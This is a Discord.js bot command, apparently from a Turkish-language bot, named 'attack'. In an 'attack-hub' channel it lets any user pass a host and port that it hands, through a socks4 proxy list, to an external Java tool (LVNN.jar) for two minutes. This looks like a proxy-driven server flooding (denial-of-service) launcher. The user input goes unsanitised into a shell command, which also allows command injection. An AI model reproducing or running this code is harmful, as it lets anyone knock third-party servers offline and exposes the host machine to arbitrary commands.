const Discord = require("discord.js");


exports.run = async (client, message, args) => {

  if(message.channel.name == "〔💣〕attack-hub"){

const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`timeout 120 java -jar LVNN.jar ${host}:${port} 300 10 LVNN socks4.txt s4`, (error, stdout, stderr) => {
});


 message.channel.send("〔💥〕Starting attack...");
  message.channel.send("〔💥〕Attack sent to **" + host + "**" + " with **" + port +"** port!");

  } else {
        message.channel.send("〔💥〕You cannot run that here")

  }


  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['attack'],
  permLevel: 0
}

exports.help = {
  name: 'attack',
  description: 'Özel',
  usage: 'attack'
}